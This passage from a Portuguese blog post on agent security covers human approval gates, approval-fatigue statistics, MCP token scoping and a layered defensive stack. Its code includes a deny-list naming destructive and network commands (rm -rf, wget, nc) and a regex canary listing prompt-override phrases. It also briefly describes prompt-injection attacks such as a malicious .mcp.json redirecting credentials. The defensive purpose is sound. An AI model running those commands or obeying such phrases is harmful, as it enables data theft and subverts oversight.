+<p>Provavelmente já adivinhas o anti-pattern. Uma equipa escreve um system prompt a dizer <em>"do not delete any files without explicit user confirmation,"</em> distribui o agente e fica surpreendida quando um prompt esperto ou um output de ferramenta corrompido contorna a instrução. <!-- 🌶️ --> O modelo não é um policy engine. É um pattern-matcher que por vezes corresponde ao padrão que escreveste e por vezes corresponde ao padrão que o atacante escreveu.</p>
+<hr />
+<h2 id="human-in-the-loop-e-os-numeros-sobre-se-alguem-le-realmente-estes-prompts">Human-in-the-Loop, e os números sobre se alguém lê realmente estes prompts</h2>
+<p>A camada de filtragem de conteúdo corre em paralelo com o modelo e observa o que ele diz. As escadas de permissões correm <em>antes</em> da ferramenta e observam o que ela tenta fazer. A terceira camada, a que apanha o que as duas primeiras falharam, é o humano. Bem feito, o HITL é um canal de escalonamento. Mal feito, é uma caixa de diálogo em que se clica 93% das vezes.</p>
+<p>O resto desta secção percorre como construir o primeiro tipo: o primitivo do LangGraph que torna o HITL possível, a camada comercial que o envolve (HumanLayer), a investigação sobre se os humanos realmente leem os prompts e o princípio de desenho que te mantém fora da zona dos 93%.</p>
+<h3 id="o-primitivo-do-langgraph">O primitivo do LangGraph</h3>
+<p>O <a href="https://docs.langchain.com/oss/python/langgraph/interrupts"><code>interrupt()</code> + <code>Command(resume=value)</code></a> do LangGraph é o primitivo de produção em 2026 — a forma de facto como os frameworks de agentes em Python pausam a execução, passam o controlo para um humano e retomam com o seu input. Há três aspetos sobre <em>como isto realmente corre</em> que te vão partir o agente se os falhares, e o primeiro é suficientemente estranho para eu citar a documentação literalmente:</p>
+<blockquote>
+<p>"When execution resumes (after you provide the requested input), the runtime restarts the entire node from the beginning — it does not resume from the exact line where <code>interrupt</code> was called."</p>
+</blockquote>
+<p>Esta única frase partiu mais agentes em produção do que qualquer outro comportamento do LangGraph. Daqui saem três problemas concretos:</p>
+<p><strong>1. Efeitos laterais antes de <code>interrupt()</code> têm de ser idempotentes.</strong> Quando o humano responde, o node inteiro corre novamente desde o topo, não desde a linha <code>interrupt()</code>. Portanto, se o teu node envia um email, pausa para aprovação e depois devolve "sent", ao retomar o email é enviado uma segunda vez. Solução: colocar os efeitos laterais <em>depois</em> do interrupt, ou torná-los seguros de repetir (dedupe keys, upsert em vez de insert, cache por message ID).</p>
+<p><strong>2. Interrupts correspondem a resumes por índice, não por nome.</strong> Se um único node tiver duas chamadas <code>interrupt()</code>, o LangGraph emparelha-as com valores <code>Command(resume=...)</code> pela ordem em que disparam. Qualquer branching que altere quantos interrupts correm (um <code>if</code> que salta um no resume, um loop que itera um número diferente de vezes) desalinha os índices e faz crash.</p>
+<p><strong>3. Os payloads têm de ser serializáveis em JSON.</strong> A pausa é escrita para um checkpointer (Postgres, Redis, SQLite) para que o agente sobreviva a um restart do processo. Objetos Python em bruto, <code>datetime</code>, <code>set</code>, classes custom: nada disso faz round-trip. Converte para dicts e primitivas antes de passares qualquer coisa para <code>interrupt()</code>.</p>
+<p>Os três padrões canónicos:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># (a) Approval gate</span>
+<span class="nd">@tool</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">send_email</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">subject</span><span class="p">,</span> <span class="n">body</span><span class="p">):</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">interrupt</span><span class="p">({</span><span class="s2">&quot;action&quot;</span><span class="p">:</span> <span class="s2">&quot;send_email&quot;</span><span class="p">,</span> <span class="s2">&quot;to&quot;</span><span class="p">:</span> <span class="n">to</span><span class="p">,</span>
+                      <span class="s2">&quot;subject&quot;</span><span class="p">:</span> <span class="n">subject</span><span class="p">,</span> <span class="s2">&quot;body&quot;</span><span class="p">:</span> <span class="n">body</span><span class="p">})</span>
+    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;action&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;approve&quot;</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">smtp_send</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">subject</span><span class="p">,</span> <span class="n">body</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s2">&quot;Email cancelled&quot;</span>
+
+<span class="c1"># (b) Edit-and-continue</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">review_node</span><span class="p">(</span><span class="n">state</span><span class="p">):</span>
+    <span class="n">edited</span> <span class="o">=</span> <span class="n">interrupt</span><span class="p">({</span><span class="s2">&quot;content&quot;</span><span class="p">:</span> <span class="n">state</span><span class="p">[</span><span class="s2">&quot;generated_text&quot;</span><span class="p">]})</span>
+    <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;generated_text&quot;</span><span class="p">:</span> <span class="n">edited</span><span class="p">}</span>
+
+<span class="c1"># (c) Mid-run state correction — loop until valid</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_age_node</span><span class="p">(</span><span class="n">state</span><span class="p">):</span>
+    <span class="n">prompt</span> <span class="o">=</span> <span class="s2">&quot;What is your age?&quot;</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">answer</span> <span class="o">=</span> <span class="n">interrupt</span><span class="p">(</span><span class="n">prompt</span><span class="p">)</span>
+        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">answer</span><span class="p">,</span> <span class="nb">int</span><span class="p">)</span> <span class="ow">and</span> <span class="n">answer</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;age&quot;</span><span class="p">:</span> <span class="n">answer</span><span class="p">}</span>
+        <span class="n">prompt</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&#39;</span><span class="si">{</span><span class="n">answer</span><span class="si">}</span><span class="s2">&#39; is not valid. Please enter a positive number.&quot;</span>
+</code></pre></div>
+<p>O resume é <code>graph.invoke(Command(resume={"action": "approve"}), config=cfg)</code>. O LangGraph 0.4+ suporta resume multi-interrupt baseado em dict para branches paralelos, o que importa no momento em que o teu agente faz fan-out.</p>
+<h3 id="humanlayer-aprovacao-como-produto">HumanLayer: aprovação como produto</h3>
+<p><a href="https://www.humanlayer.dev/docs/quickstart-python">HumanLayer</a> é a versão gerida da mesma ideia. Decoras uma função, e os pedidos de aprovação são encaminhados para Slack, email ou Discord, com regras sobre quem recebe o ping. Quando o agente tenta chamar <code>multiply(2, 5)</code>, os logs ficam assim:</p>
+<div class="highlight"><pre><span></span><code>last message led to 1 tool calls: [(&#39;multiply&#39;, &#39;{&quot;x&quot;:2,&quot;y&quot;:5}&#39;)]
+HumanLayer: waiting for approval for multiply
+</code></pre></div>
+<p>O aprovador clica approve ou deny no Slack. Em caso de deny, a documentação do HumanLayer diz assim: <em>"HumanLayer will pass your feedback back to the agent, which can then adjust its approach."</em> Esta última parte é o que separa uma camada HITL real de uma caixa de confirmação glorificada. O humano torna-se um sinal sobre o qual o agente raciocina, dentro do mesmo loop, em vez de um gate que só conhece sim ou não.</p>
+<h3 id="os-numeros-de-que-ninguem-quer-falar">Os números de que ninguém quer falar</h3>
+<p>A Anthropic publicou os dados reais em <a href="https://www.anthropic.com/research/measuring-agent-autonomy">fevereiro de 2026</a>. Três conclusões importam mais do que o resto.</p>
+<blockquote>
+<p>"We found that 80% of tool calls come from agents that appear to have at least one kind of safeguard (like restricted permissions or human approval requirements), 73% appear to have a human in the loop in some way, and only 0.8% of actions appear to be irreversible."</p>
+</blockquote>
+<p>Essa é a boa notícia. Trata 80% como um limite superior, porque a nota 14 da Anthropic acrescenta que <em>"Claude often overestimated human involvement, so we expect 80% to be an upper bound."</em></p>
+<blockquote>
+<p>"Newer users (&lt;50 sessions) employ full auto-approve roughly 20% of the time; by 750 sessions, this increases to over 40% of sessions."</p>
+</blockquote>
+<p>Este é o drift. Os utilizadores começam cautelosos. Os utilizadores tornam-se menos cautelosos à medida que ganham confiança na ferramenta. É isto que os humanos fazem. Não é uma falha de caráter. É um sinal de telemetria de que o teu sistema precisa de estar consciente. (Uma pequena nota de fact-check: cobertura secundária amplamente citada apresentou isto como "20% → over 50%." Face aos dados primários da Anthropic, o número verificado é 20% → over 40%. Se viste o número de 50%, foi daí que veio e é por isso.)</p>
+<p>E depois há a punch line do post de engenharia da Anthropic de <a href="https://www.anthropic.com/engineering/claude-code-auto-mode">março de 2026</a> sobre o auto mode do Claude Code:</p>
+<blockquote>
+<p>"Claude Code users approve 93% of permission prompts. We built classifiers to automate some decisions, increasing safety while reducing approval fatigue... If a session accumulates 3 consecutive denials or 20 total, we stop the model and escalate to the human."</p>
+</blockquote>
+<p><strong>93% de aprovação</strong> é a verdadeira história. Quando uma caixa de diálogo é aprovada nove vezes em cada dez, já não é um controlo de segurança. É telemetria. <!-- 🌶️ --> É o equivalente em UX ao banner de consentimento de cookies: tecnicamente presente, funcionalmente ignorado. A resposta da Anthropic é arquitetural. Um classificador de dois estágios (filtro rápido de token único, depois chain-of-thought só se for assinalado, 0.4% FPR) <em>remove</em> prompts de aprovação para ações de baixo risco e <em>pára o loop completamente</em> se as negações se acumularem.</p>
+<h3 id="o-principio-de-desenho">O princípio de desenho</h3>
+<p>Só escalonamento. Allowlist para ações rotineiras, logging dessas ações e apresentar apenas exceções. Classifica cada ação pelo blast radius: os ~99% que são reversíveis (edições, leituras, safe shell commands) devem passar com logging e sem qualquer prompt. O ~1% que é <em>irreversível</em> — <code>rm -rf</code>, <code>git push --force</code>, um <code>DROP TABLE</code>, enviar um email, gastar dinheiro — é onde um prompt humano realmente justifica existir. A Anthropic formula-o bem: <em>"effective oversight doesn't require approving every action but being in a position to intervene when it matters."</em></p>
+<p>Por isso, a contagem de aprovações é uma métrica de produto, e deves lê-la assim. A métrica upstream mais limpa é <strong>taxa de escalonamento</strong> — que fração das ações do agente desencadeia um prompt sequer. A orientação da indústria converge em <strong>~10–15%</strong> (<a href="https://galileo.ai/blog/human-in-the-loop-agent-oversight">Galileo</a>), ajustada para cima em domínios regulados (finanças, saúde) e para baixo em domínios rotineiros. Abaixo de 10% e os teus humanos nunca veem nada real. Acima de 15% e estás de volta ao território do carimbo automático com 93% de aprovação.</p>
+<p>Para os prompts que <em>realmente</em> disparam, o <a href="https://www.anthropic.com/engineering/claude-code-auto-mode">post sobre auto-mode</a> da Anthropic não publica deliberadamente uma taxa de aprovação alvo. Apenas trata 93% como evidência do problema. O consenso informal anda algures entre <strong>60–80%</strong>: sim suficientes para que os utilizadores não fiquem enterrados em negações, nãos suficientes para que estejam mesmo a ler. Um diagnóstico aproximado:</p>
+<ul>
+<li><strong>95%+ de aprovação</strong> → os teus prompts são ruído. Faz allowlist de forma mais agressiva, escala menos.</li>
+<li><strong>30% de aprovação</strong> → o agente está a propor as coisas erradas. Faz debug ao planner, à ferramenta ou ao modelo mental do utilizador sobre o que pediu.</li>
+<li><strong>60–80% de aprovação</strong> → provavelmente saudável. Continua a observar os números de drift — a subida de 20%→40% de auto-approve do estudo da Anthropic também vai aparecer nos teus.</li>
+</ul>
+<p>Os modos de falha são simétricos, e ambos merecem debugging.</p>
+<hr />
+<h2 id="scoping-de-mcp-e-supply-chain">Scoping de MCP e supply chain</h2>
+<p>MCP é a última peça da stack de 2026, e é aquela que toda a gente trata como canalização — até o cano rebentar. É a camada que permite aos agentes falar com ferramentas externas: um servidor Slack, um servidor GitHub, um servidor de base de dados, o que for preciso ao agente. O que tornou a cadeia de ataque do CVE-2025-59536 possível foi o facto de o desenho antigo do MCP não ter forma de dizer "este token pertence a este servidor e a mais nenhum." O novo desenho corrige isso, e vale a pena percorrer como lá chegámos, porque a forma da correção diz-te o que verificar nos teus próprios servidores.</p>
+<h3 id="autorizacao-mcp-em-tres-revisoes">Autorização MCP em três revisões</h3>
+<p>A <a href="https://modelcontextprotocol.io/specification/2025-03-26/basic/authorization">spec de 2025-03-26</a> tornava obrigatório OAuth 2.1 com PKCE, o fluxo standard para clientes públicos. Essa parte estava certa, mas a spec estava incompleta de uma forma subtil e perigosa. Misturava dois papéis muito diferentes que um servidor MCP podia desempenhar: o <em>authorization server</em> (AS), que emite tokens, e o <em>resource server</em> (RS), que os aceita. Quando o mesmo servidor pode fazer os dois, um cliente pode entregar um token ao servidor A e, se o servidor A encaminhar o pedido upstream para o servidor B, a mesma credencial acaba por viajar para onde nunca foi suposto ir. Esse é o buraco.</p>
+<p>A revisão de 2025-06-18 fechou-o ao traçar uma linha rígida. A partir desse momento, <strong>os servidores MCP são estritamente OAuth 2.1 Resource Servers</strong>: aceitam tokens emitidos por um authorization server externo e nunca emitem os seus próprios. A correção estrutural que faz isto realmente funcionar é <strong>RFC 8707 Resource Indicators</strong>, agora obrigatória. Resource Indicators vinculam um token a um servidor específico através de uma claim <code>aud</code> (audience), por isso o token fica criptograficamente limitado a "servidor X, e mais nenhum." Além disso, os servidores estão proibidos de encaminhar o token do cliente para outro serviço upstream, e RFC 9728 Protected Resource Metadata substitui o antigo fallback de "adivinhar o token endpoint a partir de um URL por omissão" por discovery explícito.</p>
+<p>É por isso que ataques ao estilo CVE-2025-59536 já não funcionam. Mesmo que um repo malicioso redirecione <code>ANTHROPIC_BASE_URL</code> para um host do atacante, os tokens que lá chegam transportam uma claim <code>aud</code> a nomear o host <em>legítimo</em>. O servidor do atacante não os consegue usar, nem qualquer entidade para quem o atacante os encaminhe. Audience-binding é um pequeno detalhe criptográfico que fecha um grande buraco de política — não tens de confiar que todos os servidores na cadeia se comportem bem, porque o próprio token recusa ser reutilizado.</p>
+<h3 id="a-checklist-mcp-de-2026">A checklist MCP de 2026</h3>
+<p>Se estás a distribuir ou a consumir MCP em produção:</p>
+<ol>
+<li><strong>Autenticação não é opcional.</strong> O CVE do Azure MCP Server não tinha auth, ponto final. Se o teu servidor aceita tráfego sem verificar um token, construíste uma ferramenta que qualquer atacante na mesma rede pode chamar.</li>
+<li><strong>Os tokens estão vinculados à audiência.</strong> Cada token MCP transporta uma claim <code>aud</code> (audience) — um campo dentro do token que nomeia exatamente um servidor, da mesma forma que uma morada identifica uma casa. O teu trabalho é verificar, em cada request, que o teu próprio servidor é o nomeado. Se não o fizeres, qualquer token que um atacante tenha roubado de qualquer outro servidor também funcionará contra o teu, e a partir do teu poderá chegar a todos os sistemas a que o teu liga.</li>
+<li><strong>Dá a cada ferramenta apenas as permissões de que realmente precisa.</strong> As permissões vivem no servidor, não na ferramenta — por isso, se um servidor MCP de Slack tiver permissão para publicar mensagens (<code>chat:write</code>), todas as ferramentas Slack nesse servidor herdam essa permissão, incluindo ferramentas que deviam apenas ler. Divide-as em servidores separados quando puderes, para que um bug numa ferramenta não consiga usar silenciosamente uma permissão de que nunca precisou.</li>
+<li><strong>Usa tokens frescos e de curta duração em vez de API keys permanentes.</strong> O padrão do cofre do Claude Managed Agents (<a href="https://www.anthropic.com/engineering/managed-agents">Anthropic engineering</a>) é a referência: o próprio agente nunca vê as credenciais reais. Um serviço intermediário guarda-as, vai buscar um token fresco no momento em que a ferramenta é chamada, usa-o em nome do agente e devolve apenas o resultado.</li>
+</ol>
+<h3 id="supply-chain-e-a-versao-aborrecida-de-tudo-isto">Supply chain é a versão aborrecida de tudo isto</h3>
+<p>Os incidentes com axios e Trivy não são exóticos. São o mesmo problema que toda a gente tem com npm e GitHub Actions há anos, aplicado a agentes que executam dependências automaticamente. O twist específico de agentes é que o blast radius é maior, porque um agente corre <code>npm install</code> em mil projetos numa semana sem qualquer problema. <!-- 🌶️ --> A tua disciplina de supply chain agora corre à velocidade do agente, que é muito mais rápida do que a tua incident response.</p>
+<p>A defesa não é inteligente. É:</p>
+<ul>
+<li>Fixar versões no lockfile. Os agentes não podem <code>--latest</code>.</li>
+<li>Fazer scan em CI com ferramentas que não sejam elas próprias a ferramenta comprometida. <!-- 🌶️ --> (O Trivy foi, por breves momentos, a lição.)</li>
+<li>Usar commit SHAs do GitHub para Actions, não tags.</li>
+<li>Rever os diffs de dependências em PRs conduzidos por agentes antes de fazer merge.</li>
+</ul>
+<p>Nada disto é novo. Tudo isto passa a ser estrutural quando um agente o executa dez mil vezes por dia.</p>
+<hr />
+<h2 id="uma-stack-guardia-para-o-agente-market-analyst">Uma stack guardiã para o agente Market Analyst</h2>
+<p>O <a href="https://github.com/slavadubrov/market-analyst-agent">Market Analyst Agent</a> da <a href="/blog/2026/01/31/the-cognitive-engine--choosing-the-right-reasoning-loop/">Parte 1</a> é um pequeno agente LangGraph. Vai buscar dados de mercado, resume investigação e <em>não</em> deve chamar comandos shell, escrever fora do seu workspace ou exfiltrar nada. Eis o aspeto de uma stack guardiã mínima para ele.</p>
+<h3 id="camada-1-um-hook-pretooluse-deny-list">Camada 1: um hook PreToolUse deny-list</h3>
+<p>Mesmo um agente que "só lê dados de ações" pode tentar coisas que não deve: um <code>curl</code> para um URL controlado por um atacante, escritas fora do workspace, mutações <code>git</code> no repo do host. Uma regra deny é infraestrutura, não prompt.</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># agent/permissions.py</span>
+<span class="n">DENY_COMMANDS</span> <span class="o">=</span> <span class="nb">frozenset</span><span class="p">({</span>
+    <span class="s2">&quot;rm -rf&quot;</span><span class="p">,</span> <span class="s2">&quot;sudo&quot;</span><span class="p">,</span> <span class="s2">&quot;chmod 777&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;curl -X POST&quot;</span><span class="p">,</span> <span class="s2">&quot;wget&quot;</span><span class="p">,</span> <span class="s2">&quot;nc &quot;</span><span class="p">,</span>
+<span class="p">})</span>
+<span class="n">DENY_PATHS</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="s2">&quot;/etc&quot;</span><span class="p">,</span> <span class="s2">&quot;/Users&quot;</span><span class="p">,</span> <span class="s2">&quot;/.ssh&quot;</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">pre_tool_use</span><span class="p">(</span><span class="n">tool_name</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">args</span><span class="p">:</span> <span class="nb">dict</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span> <span class="o">|</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">tool_name</span> <span class="o">==</span> <span class="s2">&quot;shell&quot;</span><span class="p">:</span>
+        <span class="n">cmd</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;command&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">bad</span> <span class="ow">in</span> <span class="n">cmd</span> <span class="k">for</span> <span class="n">bad</span> <span class="ow">in</span> <span class="n">DENY_COMMANDS</span><span class="p">):</span>
+            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;permissionDecision&quot;</span><span class="p">:</span> <span class="s2">&quot;deny&quot;</span><span class="p">,</span>
+                    <span class="s2">&quot;reason&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;command pattern disallowed: </span><span class="si">{</span><span class="n">cmd</span><span class="si">!r}</span><span class="s2">&quot;</span><span class="p">}</span>
+    <span class="k">if</span> <span class="n">tool_name</span> <span class="o">==</span> <span class="s2">&quot;write_file&quot;</span><span class="p">:</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;path&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">path</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">DENY_PATHS</span><span class="p">):</span>
+            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;permissionDecision&quot;</span><span class="p">:</span> <span class="s2">&quot;deny&quot;</span><span class="p">,</span>
+                    <span class="s2">&quot;reason&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;path outside workspace: </span><span class="si">{</span><span class="n">path</span><span class="si">!r}</span><span class="s2">&quot;</span><span class="p">}</span>
+    <span class="k">return</span> <span class="kc">None</span>  <span class="c1"># fall through to mode / canUseTool</span>
+</code></pre></div>
+<p>Um pre-tool hook, um frozenset, uma resposta deny estruturada. O agente vê a negação como uma observação e pode raciocinar sobre ela. O hook tem precedência sobre o mode. O mode tem precedência sobre a opinião do modelo.</p>
+<h3 id="camada-2-um-input-canary-para-prompt-injection">Camada 2: um input canary para prompt injection</h3>
+<p>Agent-goal hijack (ASI01) chega muitas vezes pelo input: uma página web recuperada, uma mensagem fornecida pelo utilizador, um PDF de um artigo de investigação. Uma verificação <em>canary</em> (uma passagem barata de regex que assinala strings suspeitas antes de chegarem ao modelo) não apanha evasões ao nível do EchoLeak, mas apanha 80% das injeções oportunistas:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># agent/input_canary.py</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+
+<span class="n">INJECTION_PATTERNS</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;ignore (previous|all|prior) (instructions|rules)&quot;</span><span class="p">,</span>
+               <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">),</span>
+    <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;you are now|act as|roleplay as&quot;</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">),</span>
+    <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;system[ _:]*prompt&quot;</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">),</span>
+    <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;&lt;\|im_(start|end)\|&gt;&quot;</span><span class="p">),</span>
+<span class="p">]</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">input_canary</span><span class="p">(</span><span class="n">text</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span> <span class="o">|</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">pat</span> <span class="ow">in</span> <span class="n">INJECTION_PATTERNS</span><span class="p">:</span>
+        <span class="n">m</span> <span class="o">=</span> <span class="n">pat</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">m</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;flag&quot;</span><span class="p">:</span> <span class="s2">&quot;possible_injection&quot;</span><span class="p">,</span> <span class="s2">&quot;match&quot;</span><span class="p">:</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">)}</span>
+    <span class="k">return</span> <span class="kc">None</span>
+</code></pre></div>
+<p>Regista os inputs assinalados; não os rejeites automaticamente. Aqui os falsos positivos são caros para um assistente de investigação. Mas o log é o que te permite notar quando a contagem de flags dispara de repente a partir de um utilizador.</p>
+<h3 id="camada-3-validacao-estruturada-do-output-via-stop-hook">Camada 3: validação estruturada do output via Stop hook</h3>
+<p>Um modelo Pydantic mais um hook <code>Stop</code> dão-te um loop apertado de validate-then-retry para geração de relatórios. O agente não pode afirmar "done" até que o output passe a validação de schema e um smoke test:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># agent/stop_hook.py</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">pydantic</span><span class="w"> </span><span class="kn">import</span> <span class="n">ValidationError</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">agent.schemas</span><span class="w"> </span><span class="kn">import</span> <span class="n">MarketReport</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">on_stop</span><span class="p">(</span><span class="n">final_output</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">report</span> <span class="o">=</span> <span class="n">MarketReport</span><span class="o">.</span><span class="n">model_validate_json</span><span class="p">(</span><span class="n">final_output</span><span class="p">)</span>
+    <span class="k">except</span> <span class="n">ValidationError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;decision&quot;</span><span class="p">:</span> <span class="s2">&quot;continue&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;feedback&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;schema invalid: </span><span class="si">{</span><span class="n">e</span><span class="o">.</span><span class="n">errors</span><span class="p">()[:</span><span class="mi">3</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">}</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">report</span><span class="o">.</span><span class="n">tickers</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;decision&quot;</span><span class="p">:</span> <span class="s2">&quot;continue&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;feedback&quot;</span><span class="p">:</span> <span class="s2">&quot;no tickers in report — did you skip the snapshot step?&quot;</span><span class="p">}</span>
+    <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;decision&quot;</span><span class="p">:</span> <span class="s2">&quot;allow_stop&quot;</span><span class="p">}</span>
+</code></pre></div>
+<p>Três linhas de validação de schema e um smoke check são a diferença entre "o agente disse que estava feito" e "o output é realmente um relatório." É um seguro barato.</p>
+<h3 id="camada-4-um-interrupt-gate-sobre-qualquer-acao-de-saida">Camada 4: um interrupt gate sobre qualquer ação de saída</h3>
+<p>O analista de mercado nunca devia enviar email nem publicar no Slack. Mas se alguma vez tiver uma ferramenta que possa fazê-lo, essa ferramenta fica envolvida em <code>interrupt()</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># agent/tools/notify.py</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">langgraph.types</span><span class="w"> </span><span class="kn">import</span> <span class="n">interrupt</span>
+
+<span class="nd">@tool</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">send_report</span><span class="p">(</span><span class="n">to</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">body</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">interrupt</span><span class="p">({</span>
+        <span class="s2">&quot;action&quot;</span><span class="p">:</span> <span class="s2">&quot;send_report&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;to&quot;</span><span class="p">:</span> <span class="n">to</span><span class="p">,</span>
+        <span class="s2">&quot;body_preview&quot;</span><span class="p">:</span> <span class="n">body</span><span class="p">[:</span><span class="mi">400</span><span class="p">],</span>
+    <span class="p">})</span>
+    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;action&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;approve&quot;</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">smtp_send</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">body</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s2">&quot;send cancelled by human&quot;</span>
+</code></pre></div>
+<p>Ações de saída são o último quilómetro da lethal trifecta. Aplica-lhes gating explícito. O número de 0.8% do artigo da Anthropic provavelmente está certo para a execução média; a maioria das coisas é reversível. Email não é. <!-- 🌶️ --> Nunca veio nada de útil de um agente que envia email ao teu CFO sem perguntar.</p>
+<h3 id="o-que-esta-stack-nao-faz">O que esta stack não faz</h3>
+<p>Sejamos honestos quanto aos limites. Isto não é uma defesa contra:</p>
+<ul>
+<li>Uma dependência upstream comprometida (classe axios). O agente executa o que <code>uv sync</code> disser para executar.</li>
+<li>Um <code>.mcp.json</code> malicioso num repo clonado (classe CVE-2025-59536). O modelo de permissões do cliente MCP do host é onde isso é apanhado, não o código do agente.</li>
+<li>Uma cadeia de roubo de dados construída com ferramentas legítimas (classe EchoLeak) — o agente a ler dados privados, o agente a fazer fetch de URLs externos e o agente a enviar mensagens para fora. Precisamos do enquadramento da trifecta: não combinar essas três capacidades de todo.</li>
+</ul>
+<p>Estes hooks são o chão local. O resto vive no harness e no SO. Isso é a Parte 5.</p>
+<hr />
+<h2 id="principais-conclusoes">Principais conclusões</h2>
+<ol>
+<li><strong>Os guardrails de LLM envolvem uma chamada ao modelo. Os guardiões de agentes envolvem o loop.</strong> Ambos são necessários. Só o segundo apanha EchoLeak, Amazon Q, Azure MCP, Claude Code CVE-2025-59536, axios e Trivy.</li>
+<li><strong>Oito das dez categorias OWASP ASI para 2026 dizem respeito ao harness, não ao output do modelo.</strong> A distribuição dos incidentes e a distribuição da OWASP concordam: a classe de ameaça dominante mudou para baixo do modelo.</li>
+<li><strong>Permissões são infraestrutura, não prompt.</strong> Primeiro regras de deny, depois regras de ask, depois hooks PreToolUse, depois regras de allow, depois mode, depois callback. Os hooks têm precedência sobre os modes. Protected paths continuam protegidos sob <code>bypassPermissions</code>.</li>
+<li><strong>Trata o deny estruturado de um hook PreToolUse como apenas mais uma observação de ferramenta.</strong> O reasoning loop já sabe lidar com isso. Não precisas de um workflow de segurança separado.</li>
